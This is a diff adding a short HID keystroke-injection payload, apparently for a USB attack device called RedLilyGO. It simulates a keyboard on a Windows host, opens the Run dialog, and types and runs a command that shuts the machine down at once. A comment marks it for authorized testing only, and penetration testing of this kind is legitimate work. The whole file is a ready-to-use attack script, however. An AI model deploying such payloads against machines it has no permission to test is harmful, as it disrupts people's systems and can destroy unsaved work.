@@ -1,0 +1,7 @@
+REM RedLilyGO - Power Off (Windows HID). Shuts the host down via Win+R. Authorized testing only.
+DELAY 1500
+GUI r
+DELAY 800
+STRING shutdown /s /t 0
+DELAY 500
+ENTER
